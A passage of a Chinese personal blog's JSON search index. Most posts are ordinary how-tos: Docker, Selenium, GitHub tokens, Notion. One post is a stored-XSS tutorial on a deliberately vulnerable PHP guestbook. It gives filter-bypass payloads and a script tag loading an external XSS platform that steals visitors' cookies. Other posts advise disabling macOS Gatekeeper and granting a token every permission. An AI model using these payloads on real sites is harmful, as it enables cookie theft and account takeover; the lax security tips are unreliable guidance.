文件，然后将 Moby 的鲸鱼图标拖拽到 Application 文件夹即可。 运行 Docker 中的服务 从您的桌面应用中找到 Docker 图标并点击运行。 运行之后，会在右上角菜单栏看到多了一个 Moby 鲸鱼图标，这个图标表明了 Docker 的运行状态。 每次点击鲸鱼图标会弹出操作菜单。 之后，您可以在终端通过命令检查安装后的 Docker 版本。 12$ docker --versionDocker version 20.10.0, build 7287ab3 （可选）如果 docker version、docker info 都正常的话，可以尝试运行一个 Nginx 服务器。 运行以下命令运行 Nginx 服务。 1$ docker run -d -p 80:80 --name webserver nginx 服务运行后，访问 http://localhost，如果看到了 “Welcome to nginx!”，就说明 Docker Desktop for Mac 安装成功了。 要停止 Nginx 服务器并删除执行下面的命令： 12$ docker stop webserver$ docker rm webserver 镜像加速如果您在使用过程中发现拉取 Docker 镜像十分缓慢，可以配置 Docker 国内镜像加速。","categories":[{"name":"运维","slug":"运维","permalink":"https://www.zhengjunyao.top/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://www.zhengjunyao.top/tags/Docker/"}]},{"title":"存储型xss的攻防","slug":"存储型_XSS_的攻防","date":"2022-06-15T03:06:34.185Z","updated":"2022-07-17T14:45:31.608Z","comments":true,"path":"2022/06/15/存储型_XSS_的攻防/","link":"","permalink":"https://www.zhengjunyao.top/2022/06/15/%E5%AD%98%E5%82%A8%E5%9E%8B_XSS_%E7%9A%84%E6%94%BB%E9%98%B2/","excerpt":"","text":"存储型 XSS 是通过对网页注入可执行代码且成功地被浏览器执行，达到攻击的目的，一般是注入一段 javascript 脚本。 不想做开发的黑客不是好黑客。 本文只对存储型 XSS 进行分析。那么，什么是存储型 XSS 呢？ 它是通过对网页注入可执行代码且成功地被浏览器执行，达到攻击的目的，一般是注入一段 javascript 脚本。在测试过程中，我们一般是使用： 12&lt;script&gt;alert(1)&lt;/script&gt; 通过这段 js 代码，弹个框来证明存在 xss 漏洞。那么，可能新手就会问了，弹个框有什么用呢？ 其实，弹框只是为了证明存在此漏洞。而此漏洞的利用方式由很多种。 比如，你可以使用 xss 平台： 写入一段平台生成的 xss 脚本： 12&lt;script src=//xsspt.com/ZsgUBf&gt;&lt;/script&gt; 当某人进入带有这个脚本的页面时，js 脚本会获取他的 cookie 并发往 xss 平台。 你只需要登录 xss 平台等待即可，拿到 cookie 后，可以不需要密码登录他的账号。 注意：本文的重点是一步一步以黑客的角度进行 xss 攻击，再讨论如何站在开发者的角度去一步一步防御 xss 攻击。所以我会在本文中以开发的身份修正后端代码，再以黑客的身份进行前端页面的 xss 攻击，这一点需要注意哦。 对于存储型 xss 漏洞的表现形式，比较经典的是留言板。但是我们都是遵纪守法的好同学，不能对外面的网站进行测试，所以就花半个小时自己手撸一个留言板咯。 首先，应该有前端展示的页面 Message_Board.php 和后端存储数据的页面 addMessage.php 前端代码不是本文重点（感兴趣的可以去看看代码：https://github.com/BrucessKING/Back-stage-Management） 我们重点关注后端代码 addMessage.php： 1234567891011121314151617181920&lt;?php $nickname = @$_POST[&#x27;nickname&#x27;];//昵称 $email = @$_POST[&#x27;email&#x27;];//邮箱 $content = @$_POST[&#x27;content&#x27;];//留言内容 $now_time = @$_POST[&#x27;now_time&#x27;];//留言时间 $ini= @parse_ini_file(&quot;config.ini&quot;); $con = @mysql_connect($ini[&quot;servername&quot;],$ini[&quot;username&quot;],$ini[&quot;password&quot;]); if($con)&#123; mysql_query(&quot;set names &#x27;utf8&#x27;&quot;);//解决中文乱码问题 mysql_select_db($ini[&quot;dbname&quot;]); $sql1 = &quot;select count(*) from message_board&quot;; $result = mysql_query($sql1); $floor = mysql_fetch_row($result)[0] + 1; $sql = &quot;insert into message_board values($floor,\\&quot;$nickname\\&quot;,\\&quot;$email\\&quot;,\\&quot;$content\\&quot;,\\&quot;$now_time\\&quot;)&quot;; mysql_query($sql); &#125;?&gt; 可以看到，我们对传入的四个参数完全没有处理，而是直接存入数据库中。 所以，只要我们这样输入： 提交之后，系统会自动刷新页面出现弹框： 点击确定后，你会发现留言内容和留言者的部分都为空。 这是因为 js 脚本已经被解析了，这时我们按 F12，打开浏览器的开发者工具，发现了 js 脚本。 那么，问题来了。 毕竟我们还有另外一个身份，开发者该如何防御呢？ 0x00、来个最简单的，只修改前端代码在 input 标签里面加上 maxlength 属性 123&lt;input type=&quot;text&quot; &gt; 至于原理嘛，就是因为 js 脚本的形式为 长度为 17，所以只要我们在前端对长度进行限制，就可以阻止黑客进行 xss 攻击了 可是！开发可没这么好做！ 我们是想做开发的黑客，所以还得自己搞自己。 作为攻击者，我们同样可以修改前端代码，具体的操作是使用浏览器的 F12（开发者工具） 可以看到，我们可以直接进行长度的修改。 另外，还可以用抓包的方法，在包里面直接写，也是不受长度限制的。 0x01、对关键字 script 进行过滤作为开发者，你很容易发现，要想进行 xss 攻击，必须插入一段 js 脚本，而 js 脚本的特征是很明显的，脚本中包含 script 关键字，那么我们只需要进行 script 过滤即可。 回到之前的代码。 为方便说明，我只取 nickname 参数，其实传入的四个参数需要做同样的处理。 123$nickname = str_replace(&quot;script&quot;, &quot;&quot;, @$_POST[&#x27;nickname&#x27;]);//昵称 上面这个 str_replace() 函数的意思是把 script 替换为空。 可以看到，script 被替换为空，弹框失败。 那么黑客该如何继续进行攻击呢？ 答案是：大小写绕过 123&lt;sCrIPt&gt;alert(1)&lt;/ScripT&gt; 因为 js 是不区分大小写的，所以我们的大小写不影响脚本的执行 成功弹框 ****0x02、使用 str_ireplace() 函数进行不区分大小写地过滤 script 关键字作为一名优秀的开发，发现了问题当然要及时改正，不区分大小写不就行了嘛 后端代码修正如下： 123$nickname = str_ireplace(&quot;script&quot;, &quot;&quot;, @$_POST[&#x27;nickname&#x27;]);//昵称 str_ireplace() 函数类似于上面的 str_replace（），但是它不区分大小写。 那么，大黑阔该如何绕过？ 答案是：双写 script 123&lt;Sscriptcript&gt;alert(1)&lt;/Sscriptcript&gt; 原理就是 str_ireplace() 函数只找出了中间的 script 关键字，前面的 S 和后面的 cript 组合在一起，构成了新的 Script 关键字。 弹框成功！ 0x03、使用 preg_replace() 函数进行正则表达式过滤 script 关键字 123$nickname = preg_replace( &quot;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&quot;, &quot;&quot;, @$_POST[&#x27;nickname&#x27;]);//昵称 显然，弹框失败。 攻击者如何再一次绕过？ 答案是：用 img 标签的 oneerror 属性 123&lt;img src=x onerror=alert(1)&gt; 0x04、过滤 alert 关键字看到这里，不知道你烦了没有，以开发的角度来讲，我都有点烦。大黑阔你不是喜欢弹窗么？我过滤 alert 关键字看你怎么弹！ 1234$nickname = preg_replace( &quot;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&quot;, &quot;&quot;, @$_POST[&#x27;nickname&#x27;]);//昵称$nickname = preg_replace( &quot;(.*)a(.*)l(.*)e(.*)r(.*)t/i&quot;, &quot;&quot;, $nickname);//昵称 那么，攻击者该怎么办呢？ 答案是：编码绕过 123&lt;a href=javascript:alert(1)&gt;a&lt;/a&gt; 当点击页面上的超链接时，会弹框。 但是为什么呢？ 这种编码方式为字符编码 字符编码：十进制、十六进制 ASCII 码或 unicode 字符编码，样式为 “&amp;#数值;”, 例如 “j” 可以编码为 “&#106;” 或 “&#x6a; ” 上述代码解码之后如下： 123&lt;a href=javascript:alert(1)&gt;a&lt;/a&gt; 你能明显感觉到限制：由于使用到了 a 标签，所以只有点击时，才会弹框。 作为一个大黑阔，我们当然是不满意的，能不能让所有进入这个页面的人都弹框？ 当然可以了：用 iframe 标签编码 123&lt;iframe src=javascript:alert(1)&gt; 这种写法，同样既没有 script 关键字，又没有 alert 关键字。 可以看到弹框成功！ 可是你也能看到，由于使用了 iframe 标签，留言板的样式已经变形了。实战中尽量不要用。 0x05、过滤特殊字符优秀的开发，永不认输！你个小小的黑阔，不就是会插入 js 代码么？我过滤特殊字符，看你代码咋被解析？ 可是我不想手撸代码来列举那么多特殊字符怎么办？ php 给我们提供了 htmlentities() 函数： 123$nickname = htmlentities(@$_POST[&#x27;nickname&#x27;]);//昵称 htmlentities() 函数的作用是把字符转换为 HTML 实体。 显示结果描述实体名称实体编号&nbsp;空格&amp;nbsp;&amp;#160;&lt;小于号&amp;lt;&amp;#60;&gt;大于号&amp;gt;&amp;#62;&amp;和号&amp;amp;&amp;#38;\"引号&amp;quot;&amp;#34;'撇号&nbsp;&amp;apos; (IE 不支持)&amp;#39;￠分（cent）&amp;cent;&amp;#162;£镑（pound）&amp;pound;&amp;#163;¥元（yen）&amp;yen;&amp;#165;€欧元（euro）&amp;euro;&amp;#8364;§小节&amp;sect;&amp;#167;©版权（copyright）&amp;copy;&amp;#169;®注册商标&amp;reg;&amp;#174;™商标&amp;trade;&amp;#8482;×乘号&amp;times;&amp;#215;÷除号&amp;divide;&amp;#247; 看到这里，你可能还是不明白 HTML 字符实体是什么。我举个例子吧，当你想在 HTML 页面上显示一个小于号（&lt;）时，浏览器会认为这是标签的一部分（因为所有标签都由大于号，标签名和小于号构成），因此，为了能在页面上显示这个小于号（&lt;），我们引入了 HTML 字符实体的概念，能够在页面上显示类似于小于号（&lt;）这样的特殊符号，而不会影响到页面标签的解析。 可以看到，我们输入的内容全部显示在页面上了。 可是却没有弹框。 我们鼠标右键，查看网页源代码： 实际上，我们输入的内容已经变成了 HTML 实体： 123&lt;iframe src=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt; 无法被解析为 js 脚本。 黑客在当前场景下已经无法攻击了（在某些其他场景，即使使用了 htmlentities() 函数，仍然是可以攻击的，这就不在本文讨论范围之内了） 0x06、总结开发者不应该只考虑关键字的过滤，还应该考虑特殊符号的过滤 。 黑客在面对未知的情况时，要不断尝试，这对于知识的储备量有较高的要求。 对于 xss 攻击，站在开发者角度来讲，仅仅用一个 htmlentities() 函数基本可以做到防御，可是一个优秀的开发者应该明白它的原理。站在黑客的角度来讲，面对环境的逐步变化，条件的逐步限制，攻击思路灵活变化是对整个职业生涯有益的。","categories":[{"name":"软件测试","slug":"软件测试","permalink":"https://www.zhengjunyao.top/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.zhengjunyao.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"Mac安装Selenium并配置ChromeDriver","slug":"在 Mac 系统下搭建 Selenium 环境并驱动 Chrome 浏览器","date":"2022-06-08T07:42:42.996Z","updated":"2022-07-17T14:44:41.553Z","comments":true,"path":"2022/06/08/在 Mac 系统下搭建 Selenium 环境并驱动 Chrome 浏览器/","link":"","permalink":"https://www.zhengjunyao.top/2022/06/08/%E5%9C%A8%20Mac%20%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BA%20Selenium%20%E7%8E%AF%E5%A2%83%E5%B9%B6%E9%A9%B1%E5%8A%A8%20Chrome%20%E6%B5%8F%E8%A7%88%E5%99%A8/","excerpt":"","text":"安装 selenium 打开终端 -&gt;pip 安装（安装命令：pip3 install selenium） 安装浏览器驱动ChromeDriver 1. 查看 Chrome 版本 打开 chrome，在设置 -&gt; 关于 Chrome 查看 Chrome 的版本号。 2. 查找 Chrome 和 ChromeDriver 的对应关系 Chrome73 以上版本，ChromeDriver 版本与 Chrome 版本均保持一致；Chrome73 以下版本，可参考以下关系表，查找 ChromeDriver 版本。 3. 下载对应 ChromeDriver 打开 ChromeDriver 下载地址：http://chromedriver.storage.googleapis.com/index.html 选择对应版本的 4. ChromeDriver 环境配置 进入 / usr/local/bin 目录（由于 Mac 该目录是隐藏的，所以可通过快捷键 command+shift+g 打开） 查看 ChromeDriver 版本：chromedriver –version。 注意，能够输出 ChromeDriver 版本即安装成功。 5. 编写脚本启动 Chrome 浏览器 123456# 启动Chromefrom selenium import webdriverdriver = webdriver.Chrome()driver.get(&#x27;http://www.baidu.com/&#x27;) # 打开百度 运行脚本，打开百度首页。 ————————————- 此处有坑 ————————————-&gt; 如果运行脚本，出现如下所示的 chromeDriver 不能运行的提示。 解决方案： 在电脑中找到终端。 2、在弹出的命令提示框中，输入 sudo spctl –master-disable，确定，提示你输入密码，密码就是你电脑的密码。 3、打开系统偏好设置，安全性与隐私里面，找到任何来源。","categories":[{"name":"软件测试","slug":"软件测试","permalink":"https://www.zhengjunyao.top/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"selenium","slug":"selenium","permalink":"https://www.zhengjunyao.top/tags/selenium/"}]},{"title":"Why’s THE Design一系列关于计算机领域中程序设计决策文章","slug":"Why’s THE Design 一系列关于计算机领域中程序设计决策的文章","date":"2022-06-08T06:41:48.956Z","updated":"2022-07-17T14:43:49.371Z","comments":true,"path":"2022/06/08/Why’s THE Design 一系列关于计算机领域中程序设计决策的文章/","link":"","permalink":"https://www.zhengjunyao.top/2022/06/08/Why%E2%80%99s%20THE%20Design%20%E4%B8%80%E7%B3%BB%E5%88%97%E5%85%B3%E4%BA%8E%E8%AE%A1%E7%AE%97%E6%9C%BA%E9%A2%86%E5%9F%9F%E4%B8%AD%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E5%86%B3%E7%AD%96%E7%9A%84%E6%96%87%E7%AB%A0/","excerpt":"","text":"Why’s THE Design 是一系列关于计算机领域中程序设计决策的文章，作者在这个系列的每一篇文章中都会提出一个具体的问题并从不同的角度讨论这种设计的优缺点、对具体实现造成的影响，文章写的非常详细，下面是目录，喜欢的可以前往学习。 Why’s THE Design 是一系列关于计算机领域中程序设计决策的文章，作者在这个系列的每一篇文章中都会提出一个具体的问题并从不同的角度讨论这种设计的优缺点、对具体实现造成的影响，文章写的非常详细，下面是目录，喜欢的可以前往学习。 Why’s THE Design：https://draven.co/whys-the-design/ 按分类组织网络 001 为什么 TCP 建立连接需要三次握手 005 为什么 DNS 使用 UDP 协议 012 为什么 TCP 协议有性能问题 013 为什么 UDP 头只有 8 个字节 017 为什么 TCP/IP 协议会拆分数据 018 为什么流媒体直播的延迟很高 019 为什么 HTTPS 需要 7 次握手以及 9 倍时延 020 为什么 TCP 协议有粘包问题 021 为什么 TCP 协议有 TIME_WAIT 状态 026 为什么 MAC 地址不需要全球唯一 027 为什么 IPv6 难以取代 IPv4 028 为什么集群需要 Overlay 网络 数据库 003 为什么 Redis 选择单线程模型 009 为什么 MySQL 使用 B+ 树 010 为什么 Redis 快照使用子进程 011 为什么 MongoDB 使用 B 树 015 为什么数据库会丢失数据 016 为什么比特币可以防篡改 024 为什么 MySQL 的自增主键不单调也不连续 031 为什么数据库不应该使用外键 036 为什么 OLAP 需要列式存储 操作系统 023 为什么 Linux 需要虚拟内存 029 为什么系统调用会消耗较多资源 030 为什么 Linux 默认页大小是 4KB 032 为什么 CPU 访问硬盘很慢 033 为什么 NUMA 会影响程序的延迟 034 为什么 HugePages 可以提升数据库性能 035 为什么 Linux 需要 Swapping 038 为什么早期的 Windows 需要整理碎片 039 为什么 Linux 和 macOS 不需要碎片整理 编程语言 014 为什么 Go 语言没有泛型 软件工程 002 为什么使用通信来共享内存 004 为什么你应该使用 Git 进行版本控制 006 为什么使用 MD5 存储密码非常危险 007 为什么基础服务不应该高可用 008 为什么总是需要无意义的 ID 018 为什么流媒体直播的延迟很高 022 为什么 0.1 + 0.2 = 0.300000004 025 为什么 0.1 + 0.2 = 0.3 037 为什么 Kubernetes 要替换 Docker 本站所有资源文章出自互联网收集整理，本站不参与制作，如果侵犯了您的合法权益，请联系本站我们会及时删除。 本站资源仅供研究、学习交流之用，若使用商业用途，请购买正版授权，否则产生的一切后果将由下载用户自行承担。","categories":[{"name":"资源","slug":"资源","permalink":"https://www.zhengjunyao.top/categories/%E8%B5%84%E6%BA%90/"}],"tags":[{"name":"学习资源","slug":"学习资源","permalink":"https://www.zhengjunyao.top/tags/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90/"}]},{"title":"github获取token","slug":"github 获取 token","date":"2022-06-07T02:36:03.578Z","updated":"2022-07-17T14:42:06.527Z","comments":true,"path":"2022/06/07/github 获取 token/","link":"","permalink":"https://www.zhengjunyao.top/2022/06/07/github%20%E8%8E%B7%E5%8F%96%20token/","excerpt":"","text":"github图床需要GitHub 的token，下面将获取 token 的过程记录一下： 1、在 https://github.com 登录你的帐号，登录以后点击右上角你的头像的 Settings 2、 点击 Developer settings 下的 Personal access tokens 如果您老人家觉得上面两个步骤很麻烦，那么您就直接进入这个链接 (前提是你要先登陆你的帐号)：https://github.com/settings/tokens 3、点击 https://github.com/settings/tokens/new 这个超链接，就是创建你的 token。 4、在 Token description 中随便填一个描述名称，下面的复选框是你这个 token 需要的权限，全部勾上就可以了。 然后点击下面这个绿色的按钮： 5、下面这个就是你的 token 了，可以直接复制使用。","categories":[{"name":"工具使用","slug":"工具使用","permalink":"https://www.zhengjunyao.top/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}],"tags":[{"name":"github","slug":"github","permalink":"https://www.zhengjunyao.top/tags/github/"}]},{"title":"selenium启动chrome配置参数问题","slug":"selenium 启动 Chrome 配置参数问题","date":"2022-06-06T08:09:00.726Z","updated":"2022-07-17T14:45:17.421Z","comments":true,"path":"2022/06/06/selenium 启动 Chrome 配置参数问题/","link":"","permalink":"https://www.zhengjunyao.top/2022/06/06/selenium%20%E5%90%AF%E5%8A%A8%20Chrome%20%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0%E9%97%AE%E9%A2%98/","excerpt":"","text":"每次当 selenium 启动 chrome 浏览器的时候，chrome 浏览器很干净，没有插件、没有收藏、没有历史记录，这是因为 selenium 在启动 chrome 时为了保证最快的运行效率，启动了一个裸浏览器，这就是为什么需要配置参数的原因，但是有些时候我们需要的不仅是一个裸浏览器。 selenium 启动配置参数接收是 ChromeOptions 类，创建方式如下： 12from selenium import webdriveroption = webdriver.ChromeOptions() 创建了 ChromeOptions 类之后就是添加参数，添加参数有几个特定的方法，分别对应添加不同类型的配置项目。 设置 chrome 二进制文件位置 (binary_location) 1234567891011121314151617from selenium import webdriveroption = webdriver.ChromeOptions()# 添加启动参数option.add_argument()# 添加扩展应用 option.add_extension()option.add_encoded_extension()# 添加实验性质的设置参数 option.add_experimental_option()# 设置调试器地址option.debugger_address() 常用配置参数： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from selenium import webdriveroption = webdriver.ChromeOptions()# 添加UAoptions.add_argument(&#x27;user-agent=&quot;MQQBrowser/26 Mozilla/5.0 (Linux; U; Android 2.3.7; zh-cn; MB200 Build/GRJ22; CyanogenMod-7) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1&quot;&#x27;)# 指定浏览器分辨率options.add_argument(&#x27;window-size=1920x3000&#x27;) # 谷歌文档提到需要加上这个属性来规避bugchrome_options.add_argument(&#x27;--disable-gpu&#x27;) # 隐藏滚动条, 应对一些特殊页面options.add_argument(&#x27;--hide-scrollbars&#x27;)# 不加载图片, 提升速度options.add_argument(&#x27;blink-settings=imagesEnabled=false&#x27;) # 浏览器不提供可视化页面. linux下如果系统不支持可视化不加这条会启动失败options.add_argument(&#x27;--headless&#x27;) # 以最高权限运行options.add_argument(&#x27;--no-sandbox&#x27;)# 手动指定使用的浏览器位置options.binary_location = r&quot;C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe&quot; #添加crx插件option.add_extension(&#x27;d:\\crx\\AdBlock_v2.17.crx&#x27;) # 禁用JavaScriptoption.add_argument(&quot;--disable-javascript&quot;) # 设置开发者模式启动，该模式下webdriver属性为正常值options.add_experimental_option(&#x27;excludeSwitches&#x27;, [&#x27;enable-automation&#x27;]) # 禁用浏览器弹窗prefs = &#123; &#x27;profile.default_content_setting_values&#x27; : &#123; &#x27;notifications&#x27; : 2 &#125; &#125; options.add_experimental_option(&#x27;prefs&#x27;,prefs)driver=webdriver.Chrome(chrome_options=chrome_options) 浏览器地址栏参数： 在浏览器地址栏输入下列命令得到相应的信息 1234567891011121314151617about:version - 显示当前版本 about:memory - 显示本机浏览器内存使用状况 about:plugins - 显示已安装插件 about:histograms - 显示历史记录 about:dns - 显示DNS状态 about:cache - 显示缓存页面 about:gpu -是否有硬件加速 chrome://extensions/ - 查看已经安装的扩展 其他配置项目参数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687–user-data-dir=”[PATH]” # 指定用户文件夹User Data路径，可以把书签这样的用户数据保存在系统分区以外的分区 –disk-cache-dir=”[PATH]“ # 指定缓存Cache路径 –disk-cache-size= # 指定Cache大小，单位Byte –first run # 重置到初始状态，第一次运行 –incognito # 隐身模式启动 –disable-javascript # 禁用Javascript --omnibox-popup-count=&quot;num&quot; # 将地址栏弹出的提示菜单数量改为num个 --user-agent=&quot;xxxxxxxx&quot; # 修改HTTP请求头部的Agent字符串，可以通过about:version页面查看修改效果 --disable-plugins # 禁止加载所有插件，可以增加速度。可以通过about:plugins页面查看效果 --disable-javascript # 禁用JavaScript，如果觉得速度慢在加上这个 --disable-java # 禁用java --start-maximized # 启动就最大化 --no-sandbox # 取消沙盒模式 --single-process # 单进程运行 --process-per-tab # 每个标签使用单独进程 --process-per-site # 每个站点使用单独进程 --in-process-plugins # 插件不启用单独进程 --disable-popup-blocking # 禁用弹出拦截 --disable-plugins # 禁用插件 --disable-images # 禁用图像 --incognito # 启动进入隐身模式 --enable-udd-profiles # 启用账户切换菜单 --proxy-pac-url # 使用pac代理 [via 1/2] --lang=zh-CN # 设置语言为简体中文 --disk-cache-dir # 自定义缓存目录 --disk-cache-size # 自定义缓存最大值（单位byte） --media-cache-size # 自定义多媒体缓存最大值（单位byte） --bookmark-menu # 在工具 栏增加一个书签按钮 --enable-sync # 启用书签同步","categories":[{"name":"软件测试","slug":"软件测试","permalink":"https://www.zhengjunyao.top/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"selenium","slug":"selenium","permalink":"https://www.zhengjunyao.top/tags/selenium/"}]},{"title":"使用notion作为日常工作流","slug":"使用notion高效管理自我 ","date":"2022-01-24T23:35:18.000Z","updated":"2022-07-17T14:44:33.211Z","comments":true,"path":"2022/01/25/使用notion高效管理自我 /","link":"","permalink":"https://www.zhengjunyao.top/2022/01/25/%E4%BD%BF%E7%94%A8notion%E9%AB%98%E6%95%88%E7%AE%A1%E7%90%86%E8%87%AA%E6%88%91%20/","excerpt":"","text":"为什么选择notion（why）onenote的缺点还没接触notion之前使用onenote作为主力笔记软件，然而onenote缺点太明显了： 界面UI实在太“微软”了，我个人很不喜欢； 作为一种富文本笔记软件，颇有让人感觉使用word写笔记一样，样式限制很死，同时对多设备下协同并不是那么完美； 支持的插件太少了，而且功能很难用，就是跳不出那种条条框框给人耳目一新的感觉； all in one notion接触notion后我完全爱上这个免费开源的软件了，我用这个工具根据我的需求构建了我日常使用场景： mac+ipad+phone phone+pocket+notion chrome+notion插件+notion notion是什么样的软件（what）在我看来，它可以作为你全部日常生活和工作的统一调度中心 notion优点： 他是一款使用markdown的软件，对于格式兼容友好很多，反正现在就是很讨厌word这些富文本； 里面有很多模版可以直接套用，也可以参考自己的使用自己随心所欲创建一个模版； 它也可以使用于项目管理，支持多人协同，在我看来跟飞书差不多而且优于飞书； 样式组件也很多，可以自行谷歌； 最关键是免费！ 我是怎么使用notion实现高效的自我管理mac+ipad+phone首先我主要使用mac上常开，使用mac占用我大多时间，iPad和phone上作为移动端上同步协同，主要强调是便携灵活，mac端和移动端都安装了notion，notion国内使用不用梯子，速度也很快 chrome+notion插件+notion首先我chrome上装了notion插件，notion也创建了可以同步浏览器的database，每次我看技术文档这些或者看到一半需要跳到其他活，或者我觉这个写得很好可以给我带来素材思路启发就收藏加上tips，我称其为idea，为了能将我每时每刻的idea都能随时记录下来，日后可以在这个database上考虑是否可以实现，从而进行排期实现，我的想法就能马上实现，随时行动实现，我称为敏捷性。 1，当我浏览到一个网页很喜欢，点击插件同步到我的notion database 2，我的notion database就会同步，我自己添加一些列 phone+pocket+notion移动端主要是我外出比如上班通勤，我获取信息渠道主要是阅读公众号技术文章，微信自带的浮窗和收藏很鸡肋，我是同步到pocket上，然后pocket同步到我的database上，这样我可以统一看到我的所有信息进行统一规划 当我在微信端阅读了一个技术文章 同步成功 我的notion思路 规划（action） 面板 知识库（repository） 数据库： 当然电影和阅读这些我觉得豆瓣上已经很好用，没必要重新手工同步建一个，就目前只有一个 notion给我带来了什么 更直观的日常自我管理 目标细分更能推动去实现的动力，拆解成每日，每周小目标依次解决 日常处理更有针对性，专注性，同时也更高效 碎片化的信息能更敏捷的体系化，并能随时留住很棒的idea去排期实现 生活工作学习更有主次优先级","categories":[{"name":"效率工具","slug":"效率工具","permalink":"https://www.zhengjunyao.top/categories/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"notion","slug":"notion","permalink":"https://www.zhengjunyao.top/tags/notion/"}]},{"title":"解决连接github中443问题","slug":"解决连接github中443问题 ","date":"2022-01-03T22:47:54.000Z","updated":"2022-07-17T14:39:31.307Z","comments":true,"path":"2022/01/04/解决连接github中443问题 /","link":"","permalink":"https://www.zhengjunyao.top/2022/01/04/%E8%A7%A3%E5%86%B3%E8%BF%9E%E6%8E%A5github%E4%B8%AD443%E9%97%AE%E9%A2%98%20/","excerpt":"","text":"问题：今天打开vscode试图克隆github上的项目但是报443连接失败，前提：我是全天24小时挂着代理，网上搜索的解决办法太垃圾了（关掉代理）自己尝试解决了 一，查看ip点开第一个连接查看github的IP地址：https://github.com.ipaddress.com/ 将网页中的 IP Address 复制下来 后面备用 点击第二个连接：https://github.com.ipaddress.com/assets-cdn.github.com 将网页中的 IP Address 复制下来 后面备用 点击第三个连接：https://github.com.ipaddress.com/assets-cdn.github.com 同理记住IP address 二，配置host使用命令： sudo nano /private/etc/hosts 输入上一步查看的ip地址 三，刷新DNSsudo killall -HUP mDNSResponder;say DNS cache has been flushed 再尝试ping github成功，完美解决","categories":[{"name":"工具使用","slug":"工具使用","permalink":"https://www.zhengjunyao.top/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"}],"tags":[{"name":"github","slug":"github","permalink":"https://www.zhengjunyao.top/tags/github/"}]}],"categories":[{"name":"效率工具","slug":"效率工具","permalink":"https://www.zhengjunyao.top/categories/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7/"},{"name":"数据库","slug":"数据库","permalink":"https://www.zhengjunyao.top/categories/%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"name":"自媒体","slug":"自媒体","permalink":"https://www.zhengjunyao.top/categories/%E8%87%AA%E5%AA%92%E4%BD%93/"},{"name":"后端","slug":"后端","permalink":"https://www.zhengjunyao.top/categories/%E5%90%8E%E7%AB%AF/"},{"name":"工具使用","slug":"工具使用","permalink":"https://www.zhengjunyao.top/categories/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"},{"name":"软件测试","slug":"软件测试","permalink":"https://www.zhengjunyao.top/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"},{"name":"运维","slug":"运维","permalink":"https://www.zhengjunyao.top/categories/%E8%BF%90%E7%BB%B4/"},{"name":"资源","slug":"资源","permalink":"https://www.zhengjunyao.top/categories/%E8%B5%84%E6%BA%90/"}],"tags":[{"name":"notion","slug":"notion","permalink":"https://www.zhengjunyao.top/tags/notion/"},{"name":"mysql","slug":"mysql","permalink":"https://www.zhengjunyao.top/tags/mysql/"},{"name":"YouTube","slug":"YouTube","permalink":"https://www.zhengjunyao.top/tags/YouTube/"},{"name":"java","slug":"java","permalink":"https://www.zhengjunyao.top/tags/java/"},{"name":"typora","slug":"typora","permalink":"https://www.zhengjunyao.top/tags/typora/"},{"name":"工作流","slug":"工作流","permalink":"https://www.zhengjunyao.top/tags/%E5%B7%A5%E4%BD%9C%E6%B5%81/"},{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.zhengjunyao.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"Docker","slug":"Docker","permalink":"https://www.zhengjunyao.top/tags/Docker/"},{"name":"selenium","slug":"selenium","permalink":"https://www.zhengjunyao.top/tags/selenium/"},{"name":"学习资源","slug":"学习资源","permalink":"https://www.zhengjunyao.top/tags/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90/"},{"name":"github","slug":"github","permalink":"https://www.zhengjunyao.top/tags/github/"}]}